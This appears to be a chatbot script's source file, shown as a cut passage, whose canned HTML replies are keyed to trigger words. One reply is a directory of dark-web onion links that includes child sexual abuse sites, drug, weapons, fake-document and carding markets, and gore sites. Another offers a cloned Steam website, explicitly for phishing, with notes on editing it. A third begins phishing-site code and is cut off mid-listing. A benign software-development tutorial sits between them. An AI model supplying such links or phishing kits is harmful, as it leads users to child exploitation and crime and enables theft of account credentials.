#e1e1e1e2;">http://kpvz7kpmcmne52qf.onion/wiki/index.php/Main_Page</a> uncensore hidden wiki</li> <li style="color: #e1e1e1e2;">12.<a href="http://bdpuqvsqmphctrcs.onion/" style="color: #e1e1e1e2;">http://bdpuqvsqmphctrcs.onion/</a> Anarchy网址导航</li> <li style="color: #e1e1e1e2;">13.<a href="http://xkow4dnkw7cusncz.onion/" style="color: #e1e1e1e2;">http://xkow4dnkw7cusncz.onion/</a> 暗网中文论坛2</li> <li style="color: #e1e1e1e2;">14.<a href="http://rfwtogljhrrzxyrl.onion/" style="color: #e1e1e1e2;">http://rfwtogljhrrzxyrl.onion/</a> lolita city</li> <li style="color: #e1e1e1e2;">15.<a href="http://mail2tor2zyjdctd.onion/" style="color: #e1e1e1e2;">http://mail2tor2zyjdctd.onion/</a> Mail2tor邮箱</li> </ul>  <h2 style="color: #e1e1e1e2;">中文相关</h2> <ul> <li style="color: #e1e1e1e2;">16.<a href="http://underdj5ziov3ic7.onion/category/CHINESE" style="color: #e1e1e1e2;">http://underdj5ziov3ic7.onion/category/CHINESE</a> 中文网址导航</li> <li style="color: #e1e1e1e2;">17.<a href="http://eg63fcmp7l7t4vzj.onion/" style="color: #e1e1e1e2;">http://eg63fcmp7l7t4vzj.onion/</a> 秘密树洞</li> <li style="color: #e1e1e1e2;">18.<a href="http://opea6td2pg66qouf.onion/" style="color: #e1e1e1e2;">http://opea6td2pg66qouf.onion/</a> torbay论坛中文</li> <li style="color: #e1e1e1e2;">19.<a href="http://wiki5kauuihowqi5.onion/" style="color: #e1e1e1e2;">http://wiki5kauuihowqi5.onion/</a> - Onion Wiki</li> <li style="color: #e1e1e1e2;">20.<a href="http://newpdsuslmzqazvr.onion/" style="color: #e1e1e1e2;">http://newpdsuslmzqazvr.onion/</a> drug</li> </ul>  <h2 style="color: #e1e1e1e2;">论坛和聊天室</h2> <ul> <li style="color: #e1e1e1e2;">21.<a href="http://postits4tga4cqts.onion/" style="color: #e1e1e1e2;">http://postits4tga4cqts.onion/</a> matrix留言板</li> <li style="color: #e1e1e1e2;">22.<a href="http://kbhpodhnfxl3clb4.onion/" style="color: #e1e1e1e2;">http://kbhpodhnfxl3clb4.onion/</a> tor搜索引擎</li> <li style="color: #e1e1e1e2;">23.<a href="http://loupsycedyglgamf.onion/PSYC/?room=EDN" style="color: #e1e1e1e2;">http://loupsycedyglgamf.onion/PSYC/?room=EDN</a> 聊天室</li> <li style="color: #e1e1e1e2;">24.<a href="http://www.glowing-bear.org/" style="color: #e1e1e1e2;">http://www.glowing-bear.org/</a> glowing bear聊天室</li> <li style="color: #e1e1e1e2;">25.<a href="http://b4d3igwmoo5355ur.onion/greatc/login.php" style="color: #e1e1e1e2;">http://b4d3igwmoo5355ur.onion/greatc/login.php</a> 中文聊天室 挂了</li> </ul>  <h2 style="color: #e1e1e1e2;">成人内容</h2> <ul> <li style="color: #e1e1e1e2;">26.<a href="http://32pbf32xi6ccm63z.onion/blog/temas/living-room/" style="color: #e1e1e1e2;">http://32pbf32xi6ccm63z.onion/blog/temas/living-room/</a> 成人porn直播间</li> <li style="color: #e1e1e1e2;">27.<a href="http://www.onion.link/" style="color: #e1e1e1e2;">http://www.onion.link/</a> onion city搜索引擎</li> <li style="color: #e1e1e1e2;">28.<a href="http://tt3j2x4k5ycaa5zt.onion/chat.php" style="color: #e1e1e1e2;">http://tt3j2x4k5ycaa5zt.onion/chat.php</a> my chat聊天室</li> <li style="color: #e1e1e1e2;">29.<a href="http://dtt6tdtgroj63iud.onion/sse/renderer?use=onions&name=default" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/sse/renderer?use=onions&name=default</a> Shitty onion search</li> <li style="color: #e1e1e1e2;">29.<a href="http://2fap3cpmi3coso5y.onion/" style="color: #e1e1e1e2;">http://2fap3cpmi3coso5y.onion/</a> porn下载</li> </ul>  <h2 style="color: #e1e1e1e2;">其他</h2> <ul> <li style="color: #e1e1e1e2;">30.<a href="https://secure.imvu.com/signup/index/?avset=bubbles" style="color: #e1e1e1e2;">https://secure.imvu.com/signup/index/?avset=bubbles</a> imvu聊天室(<a href="http://www.imvu.com/rooms/?search_terms=Egypt+Cafe+Arab" style="color: #e1e1e1e2;">http://www.imvu.com/rooms/?search_terms=Egypt+Cafe+Arab</a>)</li> <li style="color: #e1e1e1e2;">31.<a href="https://zh.wikipedia.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5" style="color: #e1e1e1e2;">https://zh.wikipedia.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5</a> wiki</li> <li style="color: #e1e1e1e2;">32.<a href="http://thehiddenwiki.org/" style="color: #e1e1e1e2;">http://thehiddenwiki.org/</a> another hideen</li> <li style="color: #e1e1e1e2;">33.<a href="http://wtwfzc6ty2s6x4po.onion/" style="color: #e1e1e1e2;">http://wtwfzc6ty2s6x4po.onion/</a> 知名恶心视频网址,需要下载</li> <li style="color: #e1e1e1e2;">34.<a href="http://www.bestgore.com/" style="color: #e1e1e1e2;">http://www.bestgore.com/</a> 变态网址</li> </ul>  <h2 style="color: #e1e1e1e2;">更多资源</h2> <ul> <li style="color: #e1e1e1e2;">35.<a href="http://hss3uro2hsxfogfq.onion/" style="color: #e1e1e1e2;">http://hss3uro2hsxfogfq.onion/</a> notEvil search</li> <li style="color: #e1e1e1e2;">36.<a href="http://imtrjn3qe2tzh5ae.onion/category/news/" style="color: #e1e1e1e2;">http://imtrjn3qe2tzh5ae.onion/category/news/</a> anonymous news</li> <li style="color: #e1e1e1e2;">37.<a href="http://dtt6tdtgroj63iud.onion" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion</a> 坚壳暗网</li> <li style="color: #e1e1e1e2;">38.<a href="http://jl4m7ubpotnu2yos.onion/" style="color: #e1e1e1e2;">http://jl4m7ubpotnu2yos.onion/</a> TorFlix</li> <li style="color: #e1e1e1e2;">39.<a href="http://dtt6tdtgroj63iud.onion/chat/" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/chat/</a> 无人区聊天室</li> <li style="color: #e1e1e1e2;">40.<a href="http://dtt6tdtgroj63iud.onion/forum/index.php" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/forum/index.php</a> 坚壳论坛</li> <li style="color: #e1e1e1e2;">41.<a href="http://tt3j2x4k5ycaa5zt.onion/onions.php" style="color: #e1e1e1e2;">http://tt3j2x4k5ycaa5zt.onion/onions.php</a> onion link list</li> <li style="color: #e1e1e1e2;">42.<a href="http://2qrdpa2pnlt25ra2.onion/" style="color: #e1e1e1e2;">http://2qrdpa2pnlt25ra2.onion/</a> Italian darknet community</li> <li style="color: #e1e1e1e2;">43.<a href="http://tetatl6umgbmtv27.onion/1XrmD/" style="color: #e1e1e1e2;">http://tetatl6umgbmtv27.onion/1XrmD/</a> isis聊天室</li> <li style="color: #e1e1e1e2;">44.<a href="http://vlr2sz44rxf5wmuu.onion/" style="color: #e1e1e1e2;">http://vlr2sz44rxf5wmuu.onion/</a> isis red room</li> <li style="color: #e1e1e1e2;">45.<a href="http://diaperedxrx4yxwv.onion/forum/" style="color: #e1e1e1e2;">http://diaperedxrx4yxwv.onion/forum/</a> cp</li> <li style="color: #e1e1e1e2;">46.<a href="http://es2adizg32j3kob5.onion/" style="color: #e1e1e1e2;">http://es2adizg32j3kob5.onion/</a> topic link</li> <li style="color: #e1e1e1e2;">47.<a href="http://hxnibog5m2ocjeef.onion/" style="color: #e1e1e1e2;">http://hxnibog5m2ocjeef.onion/</a> deepweb ministries</li> <li style="color: #e1e1e1e2;">48.<a href="http://saemf4erbrvhfddd.onion/" style="color: #e1e1e1e2;">http://saemf4erbrvhfddd.onion/</a> ccp</li> </ul>  <h1 style="color: #e1e1e1e2;">市场上的药物</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://rso4hutlefirefqp.onion/" style="color: #e1e1e1e2;">http://rso4hutlefirefqp.onion/</a>- EuCanna药用大麻味蕾里克·辛普森油、药膏和面霜</li> <li style="color: #e1e1e1e2;"><a href="http://newpdsuslmzqazvr.onion/" style="color: #e1e1e1e2;">http://newpdsuslmzqazvr.onion/</a>——人民药店Darkweb最好的网上药品供应商!</li> <li style="color: #e1e1e1e2;"><a href="http://smoker32pk4qt3mx.onion/" style="color: #e1e1e1e2;">http://smoker32pk4qt3mx.onion/</a>- Smokeables最好有机大麻从美国运来</li> </ul>  <h1 style="color: #e1e1e1e2;">其他资源</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://e2qizoerj4d6ldif.onion/" style="color: #e1e1e1e2;">http://e2qizoerj4d6ldif.onion/</a>——粗梳商店</li> <li style="color: #e1e1e1e2;"><a href="http://ramp2bombkadwvgz.onion" style="color: #e1e1e1e2;">http://ramp2bombkadwvgz.onion</a>-斜坡最大的俄罗斯市场(药物</li> <li style="color: #e1e1e1e2;"><a href="http://germanyhusicaysx.onion" style="color: #e1e1e1e2;">http://germanyhusicaysx.onion</a>德国-德国im深层网络论坛</li> <li style="color: #e1e1e1e2;"><a href="http://7haz75ietrhjds3j.onion/main3.php" style="color: #e1e1e1e2;">http://7haz75ietrhjds3j.onion/main3.php</a> （你懂的）</li> <li style="color: #e1e1e1e2;"><a href="http://smoker32pk4qt3mx.onion/" style="color: #e1e1e1e2;">http://smoker32pk4qt3mx.onion/</a>（大麻等）</li> <li style="color: #e1e1e1e2;"><a href="http://xfnwyig7olypdq5r.onion/" style="color: #e1e1e1e2;">http://xfnwyig7olypdq5r.onion/</a>（美国国籍）</li> <li style="color: #e1e1e1e2;"><a href="http://en35tuzqmn4lofbk.onion/" style="color: #e1e1e1e2;">http://en35tuzqmn4lofbk.onion/</a>（假证件0）</li> <li style="color: #e1e1e1e2;"><a href="http://cstoreav7i44h2lr.onion" style="color: #e1e1e1e2;">http://cstoreav7i44h2lr.onion</a>（电子产品 价格便宜）</li> <li style="color: #e1e1e1e2;"><a href="http://wi7qkxyrdpu5cmvr.onion/" style="color: #e1e1e1e2;">http://wi7qkxyrdpu5cmvr.onion/</a>- Autistici / Inventati</li> <li style="color: #e1e1e1e2;"><a href="http://76qugh5bey5gum7l.onion/" style="color: #e1e1e1e2;">http://76qugh5bey5gum7l.onion/</a>（自由的黑客托管服务）</li> <li style="color: #e1e1e1e2;"><a href="http://kbvbh4kdddiha2ht.onion/" style="color: #e1e1e1e2;">http://kbvbh4kdddiha2ht.onion/</a>- DeDope德国杂草和散列商店。 (比特币)</li> <li style="color: #e1e1e1e2;"><a href="http://s5q54hfww56ov2xc.onion/" style="color: #e1e1e1e2;">http://s5q54hfww56ov2xc.onion/</a>（可卡因 ）</li> </ul>  <h2 style="color: #e1e1e1e2;">OnionDir - 深网链接目录</h2> <p style="color: #e1e1e1e2;">dirnxxdraygbifgc.onion -复制和粘贴.onion链接。</p>  <h1 style="color: #e1e1e1e2;">隐藏的服务列表和搜索引擎</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://skunksworkedp2cg.onion/sites_title.html" style="color: #e1e1e1e2;">http://skunksworkedp2cg.onion/sites_title.html</a> 暗网导航地址</li> <li style="color: #e1e1e1e2;"><a href="http://deepwikizpkrt67e.onion/index.php/Main_Page" style="color: #e1e1e1e2;">http://deepwikizpkrt67e.onion/index.php/Main_Page</a> wiki镜像地址</li> <li style="color: #e1e1e1e2;"><a href="http://xkinderdwpcbdwow.onion/" style="color: #e1e1e1e2;">http://xkinderdwpcbdwow.onion/</a> -Xkinder （CP）</li> <li style="color: #e1e1e1e2;"><a href="http://armoryx7kvdq3jds.onion/" style="color: #e1e1e1e2;">http://armoryx7kvdq3jds.onion/</a> 海盗船（搜种子,虽说表网torrentkitty就可以用，意义不明）</li> <li style="color: #e1e1e1e2;"><a href="http://pfoxkj3p65uyc5pe.onion/bookmarks.htm" style="color: #e1e1e1e2;">http://pfoxkj3p65uyc5pe.onion/bookmarks.htm</a> bookmarks 与暗网中介类似</li> <li style="color: #e1e1e1e2;"><a href="http://uj3wazyk5u4hnvtk.onion/" style="color: #e1e1e1e2;">http://uj3wazyk5u4hnvtk.onion/</a> 鬼畜音乐，整人专用233333</li> <li style="color: #e1e1e1e2;"><a href="http://rfwtogljhrrzxyrl.onion/" style="color: #e1e1e1e2;">http://rfwtogljhrrzxyrl.onion/</a> -lolita city（CP）</li> <li style="color: #e1e1e1e2;"><a href="http://eh5ulwvom7hlggrm.onion/" style="color: #e1e1e1e2;">http://eh5ulwvom7hlggrm.onion/</a> 中国数据中心（不知真假，买过的请务必联系我）</li> <li style="color: #e1e1e1e2;"><a href="http://armoryx7kvdq3jds.onion/" style="color: #e1e1e1e2;">http://armoryx7kvdq3jds.onion/</a> 军火武器</li> <li style="color: #e1e1e1e2;"><a href="http://reloadedudjtjvxr.onion/road.php" style="color: #e1e1e1e2;">http://reloadedudjtjvxr.onion/road.php</a>丝绸之路3.0</li> <li style="color: #e1e1e1e2;"><a href="http://22u75kqyl666joi2.onion" style="color: #e1e1e1e2;">http://22u75kqyl666joi2.onion</a> 暗网中文论坛</li> </ul>`
            ],
        },

        "steam": {
            reply:[
                `<p>以下是Steam的官方网站仿真网站代码：</p><iframe src="https://huoshi111.github.io/lredaiSteamCodeweb/Steam%20%E7%BD%91%E7%AB%99.html" width="1200" height="900" style="border-radius: 10px; border: solid 2px rgba(175, 6, 6, 0.8);"></iframe> <br><p>里面的链接和内容您可以随意修改，主要目的是搭建一个很好的仿真Steam 钓鱼官方网站。</p> <br><h5>需要我帮你介绍以下Steam 官网代码的结构和信息吗，需要的话 请 回复: 010 </h5>`
            ],
            unlock: ["010"], // 解锁 010 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },

        "010": {  // Steam 官网 的详细介绍 解除 010
            reply: [
                `<p data-start="0" data-end="160" class="">好的， 以下是关于 Steam 官方网站 代码结构讲解，这样能够让你快速修改仿真网站的内容，在网站的可见源代码中显示3666行代码，Steam（<a data-start="11" data-end="75" rel="noopener" target="_new" class="cursor-pointer" href="https://store.steampowered.com">https://store.steampowered.com</a>）是由 Valve Corporation 运营的游戏平台官网，主要提供游戏下载、游戏介绍、促销活动、社区内容等功能。以下是该网站代码结构和主要信息的讲解（以首页为例）：</p> <hr data-start="162" data-end="165" class="" style=""> <h2 data-start="167" data-end="183" class="" style="color: #e1e1e1e2;"> 一、前端代码结构概览</h2> <p data-start="185" data-end="243" class="">Steam 的前端页面并未开源，但你可以通过浏览器“查看页面源代码”或开发者工具（F12）查看其结构。典型结构包括：</p> <h3 data-start="245" data-end="261" class="">1. <code data-start="252" data-end="258">HTML</code> 结构</h3> <p data-start="262" data-end="348" class="">Steam 使用传统的 HTML + CSS + JavaScript 构建（不是基于 React/Vue 的 SPA），页面内容通过服务端渲染动态生成，部分内容异步加载。</p> <ul data-start="350" data-end="597"> <li data-start="350" data-end="495" class="" style=""> <p data-start="352" data-end="364" class=""><code data-start="352" data-end="360">&lt;head&gt;</code> 区域：</p> <ul data-start="367" data-end="495"> <li data-start="367" data-end="395" class="" style=""> <p data-start="369" data-end="395" class="">包含基础 meta、标题、CSS 引用、语言设置等。</p> </li> <li data-start="398" data-end="458" class="" style=""> <p data-start="400" data-end="458" class="">引入多个 Valve 自定义的脚本文件（如 <code data-start="422" data-end="430">jquery</code>, <code data-start="432" data-end="442">store.js</code>, <code data-start="444" data-end="454">webui.js</code> 等）。</p> </li> <li data-start="461" data-end="495" class="" style=""> <p data-start="463" data-end="495" class="">有语言识别和地理区域控制相关代码（决定是否显示中文、人民币等）。</p> </li> </ul> </li> <li data-start="497" data-end="597" class="" style=""> <p data-start="499" data-end="511" class=""><code data-start="499" data-end="507">&lt;body&gt;</code> 区域：</p> <ul data-start="514" data-end="597"> <li data-start="514" data-end="538" class="" style=""> <p data-start="516" data-end="538" class="">顶部是导航栏（包括商店、社区、支持、登录等）</p> </li> <li data-start="541" data-end="569" class="" style=""> <p data-start="543" data-end="569" class="">主体部分会根据页面（主页、游戏页、特卖页）变化内容。</p> </li> <li data-start="572" data-end="597" class="" style=""> <p data-start="574" data-end="597" class="">页脚包括法律信息、版权、Valve 相关链接。</p> </li> </ul> </li> </ul> <h3 data-start="599" data-end="614" class="">2. <code data-start="606" data-end="611">CSS</code> 样式</h3> <ul data-start="615" data-end="761"> <li data-start="615" data-end="660" class="" style=""> <p data-start="617" data-end="660" class="">多数样式集中在 <code data-start="625" data-end="636">store.css</code> 或合并压缩后的 <code data-start="645" data-end="655">.min.css</code> 文件中。</p> </li> <li data-start="661" data-end="698" class="" style=""> <p data-start="663" data-end="698" class="">使用较传统的布局方式，结合 float 和 flex 实现响应式结构。</p> </li> <li data-start="699" data-end="761" class="" style=""> <p data-start="701" data-end="761" class="">图标和按钮样式大量使用 Sprite 图或自定义样式类（如 <code data-start="731" data-end="759">.btn_green_white_innerfade</code>）。</p> </li> </ul> <h3 data-start="763" data-end="785" class="">3. <code data-start="770" data-end="782">JavaScript</code> 功能</h3> <ul data-start="786" data-end="924"> <li data-start="786" data-end="816" class="" style=""> <p data-start="788" data-end="816" class="">使用大量 jQuery（仍然依赖 jQuery 为主）。</p> </li> <li data-start="817" data-end="924" class="" style=""> <p data-start="819" data-end="829" class="">自定义函数用于处理：</p> <ul data-start="832" data-end="924"> <li data-start="832" data-end="852" class="" style=""> <p data-start="834" data-end="852" class="">动态加载模块（如特价列表、推荐游戏）</p> </li> <li data-start="855" data-end="874" class="" style=""> <p data-start="857" data-end="874" class="">登录状态控制、添加愿望单等交互行为</p> </li> <li data-start="877" data-end="899" class="" style=""> <p data-start="879" data-end="899" class="">AJAX 接口拉取内容（推荐、个性化等）</p> </li> <li data-start="902" data-end="924" class="" style=""> <p data-start="904" data-end="924" class="">自动本地化（根据 IP 切换语言/货币）</p> </li> </ul> </li> </ul> <hr data-start="926" data-end="929" class="" style=""> <h2 data-start="931" data-end="949" class="" style="color: #e1e1e1e2;"> 二、网站主要模块和信息点</h2> <h3 data-start="951" data-end="963" class="">1. 顶部导航栏</h3> <ul data-start="964" data-end="1081"> <li data-start="964" data-end="998" class="" style=""> <p data-start="966" data-end="998" class=""><strong data-start="966" data-end="972">商店</strong>：链接至首页、游戏、软件、DLC、VR、特卖等分类。</p> </li> <li data-start="999" data-end="1035" class="" style=""> <p data-start="1001" data-end="1035" class=""><strong data-start="1001" data-end="1007">社区</strong>：进入 Steam 社区（社区市场、创意工坊、指南等）。</p> </li> <li data-start="1036" data-end="1059" class="" style=""> <p data-start="1038" data-end="1059" class=""><strong data-start="1038" data-end="1044">关于</strong>：介绍 Steam 平台本身。</p> </li> <li data-start="1060" data-end="1081" class="" style=""> <p data-start="1062" data-end="1081" class=""><strong data-start="1062" data-end="1068">支持</strong>：进入帮助与客服支持中心。</p> </li> </ul> <h3 data-start="1083" data-end="1096" class="">2. 首页模块结构</h3> <ul data-start="1097" data-end="1277"> <li data-start="1097" data-end="1138" class="" style=""> <p data-start="1099" data-end="1138" class=""><strong data-start="1099" data-end="1106">轮播图</strong>：展示主推游戏或活动，通常使用 AJAX 异步加载背景图和链接。</p> </li> <li data-start="1139" data-end="1179" class="" style=""> <p data-start="1141" data-end="1179" class=""><strong data-start="1141" data-end="1150">个性化推荐</strong>：基于用户登录状态加载推荐游戏（通过 API 接口加载）。</p> </li> <li data-start="1180" data-end="1212" class="" style=""> <p data-start="1182" data-end="1212" class=""><strong data-start="1182" data-end="1190">特价信息</strong>：列出限时折扣、周末特卖，带有价格变动信息。</p> </li> <li data-start="1213" data-end="1237" class="" style=""> <p data-start="1215" data-end="1237" class=""><strong data-start="1215" data-end="1224">新发布游戏</strong>：显示最近上架或热门游戏。</p> </li> <li data-start="1238" data-end="1277" class="" style=""> <p data-start="1240" data-end="1277" class=""><strong data-start="1240" data-end="1248">分类推荐</strong>：包括类型（RPG、动作）、标签（开放世界、多人在线）等。</p> </li> </ul> <h3 data-start="1279" data-end="1298" class="">3. 商品详情页（例如游戏页）</h3> <ul data-start="1299" data-end="1371"> <li data-start="1299" data-end="1315" class="" style=""> <p data-start="1301" data-end="1315" class="">游戏介绍（视频、截图、简述）</p> </li> <li data-start="1316" data-end="1331" class="" style=""> <p data-start="1318" data-end="1331" class="">价格、折扣信息（区域定价）</p> </li> <li data-start="1332" data-end="1344" class="" style=""> <p data-start="1334" data-end="1344" class="">用户评价、评分、标签</p> </li> <li data-start="1345" data-end="1356" class="" style=""> <p data-start="1347" data-end="1356" class="">系统需求、语言支持</p> </li> <li data-start="1357" data-end="1371" class="" style=""> <p data-start="1359" data-end="1371" class="">相关 DLC、合集包推荐</p> </li> </ul> <hr data-start="1373" data-end="1376" class="" style=""> <h2 data-start="1378" data-end="1395" class="" style="color: #e1e1e1e2;"> 三、数据来源与接口特征</h2> <ul data-start="1397" data-end="1554"> <li data-start="1397" data-end="1431" class="" style=""> <p data-start="1399" data-end="1431" class="">Steam 页面中多数动态内容通过 AJAX 调用内部 API。</p> </li> <li data-start="1432" data-end="1523" class="" style=""> <p data-start="1434" data-end="1523" class="">例如 <code data-start="1437" data-end="1495">https://store.steampowered.com/api/appdetails?appids=730</code> 返回游戏（如 CS:GO）详情数据（JSON 格式）。</p> </li> <li data-start="1524" data-end="1554" class="" style=""> <p data-start="1526" data-end="1554" class="">货币、价格、评价等依照请求头中的语言、地区参数动态生成。</p> </li> </ul> <hr data-start="1556" data-end="1559" class="" style=""> <h2 data-start="1561" data-end="1576" style="color: #e1e1e1e2;" > 四、安全与反爬机制</h2> <ul data-start="1578" data-end="1662"> <li data-start="1578" data-end="1607" class="" style=""> <p data-start="1580" data-end="1607" class="">对频繁请求（如爬虫）会返回空页面或重定向至验证码页面。</p> </li> <li data-start="1608" data-end="1632" class="" style=""> <p data-start="1610" data-end="1632" class="">使用动态请求头和 Cookie 做会话追踪。</p> </li> <li data-start="1633" data-end="1662" class="" style=""> <p data-start="1635" data-end="1662" class="">登录后页面内容会发生显著变化，需模拟登录抓取私人信息。</p> </li> </ul> <hr data-start="1664" data-end="1667" class="" style=""> <h2 data-start="1669" data-end="1676" class="" style="color: #e1e1e1e2;">总结</h2> <p data-start="1678" data-end="1710" class="">Steam 官网属于“传统结构 + 动态增强”型网站，其特点为：</p> <ul data-start="1712" data-end="1835"> <li data-start="1712" data-end="1738" class="" style=""> <p data-start="1714" data-end="1738" class="">使用 HTML 服务端渲染为主，JS 增强体验；</p> </li> <li data-start="1739" data-end="1757" class="" style=""> <p data-start="1741" data-end="1757" class="">界面模块分区明显，功能定位清晰；</p> </li> <li data-start="1758" data-end="1774" class="" style=""> <p data-start="1760" data-end="1774" class="">数据接口丰富但具备反爬策略；</p> </li> <li data-start="1775" data-end="1806" class=""> <p data-start="1777" data-end="1806" class="">使用 jQuery 和 Valve 自研组件控制交互行为；</p> </li> <li data-start="1807" data-end="1835" class=""> <p data-start="1809" data-end="1835" class="">本地化和国际化做得非常细致（货币、语言、内容筛选）。</p> </li> </ul>`
            ],
            lockAfterUse: true  // 重新把 010 锁住
        },


        "软件": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">免费零成本开发软件教程</h1> <h2 style="color: #e1e1e1e2;">1. 规划与需求分析</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">明确需求：</strong>在开始开发之前，首先要清楚自己希望软件具备哪些功能、解决什么问题以及面向哪些用户。你可以列出功能清单、用户场景和使用流程，确保开发过程中有明确的方向和目标。 </p> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">工具建议：</strong>可以利用在线流程图工具（如 <a href="https://app.diagrams.net/" style="color: #e1e1e1e2;">draw.io</a>）或者免费的思维导图软件来规划功能和设计用户流程，这有助于整体把控项目结构。 </p> <h2 style="color: #e1e1e1e2;">2. 选择编程语言与开发工具</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">选择编程语言：</strong>建议选择开源且社区资源丰富的编程语言，例如： </p> <ul> <li style="color: #e1e1e1e2;">Python：语法简单、文档丰富，适合初学者和快速开发。</li> <li style="color: #e1e1e1e2;">JavaScript：适合Web开发，结合HTML/CSS可以构建丰富的前端应用。</li> <li style="color: #e1e1e1e2;">Java：跨平台性好，适合大型企业级应用开发。</li> <li style="color: #e1e1e1e2;">C#：如果你熟悉微软生态，C#也是一个不错的选择。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">开发环境：</strong>可以使用免费且功能强大的代码编辑器和集成开发环境（IDE），例如： </p> <ul> <li style="color: #e1e1e1e2;"><a href="https://code.visualstudio.com/" style="color: #e1e1e1e2;">Visual Studio Code</a>：跨平台、插件丰富。</li> <li style="color: #e1e1e1e2;">Eclipse：适合Java开发，开源且功能完善。</li> <li style="color: #e1e1e1e2;">Atom：轻量级编辑器，适合多种编程语言。</li> </ul> <h2 style="color: #e1e1e1e2;">3. 利用开源框架与库</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">框架选择：</strong>根据软件类型选择合适的开源框架，可以大大提高开发效率。例如： </p> <ul> <li style="color: #e1e1e1e2;"><strong style="color: #e1e1e1e2;">Web开发：</strong>使用React、Angular或Vue.js构建前端；使用Django或Flask（Python）构建后端。</li> <li style="color: #e1e1e1e2;"><strong style="color: #e1e1e1e2;">移动开发：</strong>React Native和Flutter都是构建跨平台移动应用的优秀工具。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">第三方库：</strong>通过GitHub等平台查找并利用现有的开源组件和库，能让你节省开发时间，并专注于独特功能的实现。 </p> <h2 style="color: #e1e1e1e2;">4. 利用免费学习资源与社区支持</h2> <p style="color: #e1e1e1e2;"> 网络上有丰富的免费教程和文档，帮助你从零开始学习和提升开发技能。以下是一些推荐资源： </p> <ul> <li style="color: #e1e1e1e2;">YouTube、Bilibili：海量的视频教程，讲解详细、案例丰富。</li> <li style="color: #e1e1e1e2;">Coursera、edX：有很多知名大学和机构提供的免费课程。</li> <li style="color: #e1e1e1e2;">博客与论坛：如CSDN、掘金、Stack Overflow和GitHub社区，你可以在这里提问、查找资料和交流经验。</li> </ul> <h2 style="color: #e1e1e1e2;">5. 免费的版本控制和项目管理</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">版本控制：</strong>使用Git进行代码管理，可以帮助你跟踪代码修改和协作开发。将代码托管在免费的平台上，如： </p> <ul> <li style="color: #e1e1e1e2;">GitHub</li> <li style="color: #e1e1e1e2;">GitLab</li> <li style="color: #e1e1e1e2;">Bitbucket</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">项目管理：</strong>利用免费的项目管理工具，如Trello、Notion或GitHub Projects，规划任务、分配工作、跟踪进度，从而高效推进项目。 </p> <h2 style="color: #e1e1e1e2;">6. 部署与运维</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">免费云平台：</strong>软件开发完成后，可选择一些提供免费套餐的云平台进行部署，例如： </p> <ul> <li style="color: #e1e1e1e2;">Heroku：适合快速部署Web应用。</li> <li style="color: #e1e1e1e2;">Netlify或Vercel：适用于静态网站和前端项目。</li> <li style="color: #e1e1e1e2;">GitHub Pages：适合部署简单的静态网站。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">自动化工具：</strong>利用GitHub Actions等免费的CI/CD工具，实现自动化构建、测试和部署，提高项目维护效率。 </p> <h2 style="color: #e1e1e1e2;">7. 持续学习与项目迭代</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">收集反馈：</strong>软件上线后，通过用户反馈了解哪些功能受欢迎、哪些需要改进，并利用免费的数据分析工具和社区建议逐步完善软件。 </p> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">开源协作：</strong>考虑将项目开源，不仅能吸引更多开发者贡献代码，也能获得宝贵的建议和改进方案，推动项目不断进步。 </p> <h2 style="color: #e1e1e1e2;">总结</h2> <p style="color: #e1e1e1e2;"> 通过科学规划、选择合适的免费工具和充分利用开源资源，即使在零成本情况下，也能开发出功能齐全的软件。不断学习和迭代改进，是确保项目成功的关键。 </p> <h2 style="color: #e1e1e1e2;">开发步骤一览表</h2> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">语言</th> <th style="color: #e1e1e1e2;">适用类型</th> <th style="color: #e1e1e1e2;">优点</th> <th style="color: #e1e1e1e2;">难度</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;">C++</td> <td style="color: #e1e1e1e2;">系统级工具、游戏</td> <td style="color: #e1e1e1e2;">高性能、生成原生 .exe、无额外依赖</td> <td style="color: #e1e1e1e2;">高</td> </tr> <tr> <td style="color: #e1e1e1e2;">C#</td> <td style="color: #e1e1e1e2;">图形界面、业务系统</td> <td style="color: #e1e1e1e2;">开发快、界面美观</td> <td style="color: #e1e1e1e2;">中</td> </tr> <tr> <td style="color: #e1e1e1e2;">Python</td> <td style="color: #e1e1e1e2;">脚本、工具类程序</td> <td style="color: #e1e1e1e2;">语法简单、易上手</td> <td style="color: #e1e1e1e2;">低</td> </tr> </tbody> </table>`
            ],
        },



        "钓鱼": {
            reply: [
                `<p>以下是一个 钓鱼 网站 使用前端 html+css+JavaScript 与 后端 php: </p>
                <pre><code style="background-color: #2e2e2e; color:rgb(175, 175, 175); display: block; padding: 10px; border-radius: 6px;">
                <br><span><span>&lt;!DOCTYPE html&gt;
&lt;html lang=</span><span><span class="hljs-string">"en"</span></span><span>&gt;
&lt;head&gt;
    &lt;meta charset=</span><span><span class="hljs-string">"UTF-8"</span></span><span>&gt;
    &lt;title&gt;邪恶小网站&lt;/title&gt;
    &lt;style&gt;
        .div1{
            margin-top: </span><span><span class="hljs-number">5</span></span><span>%;
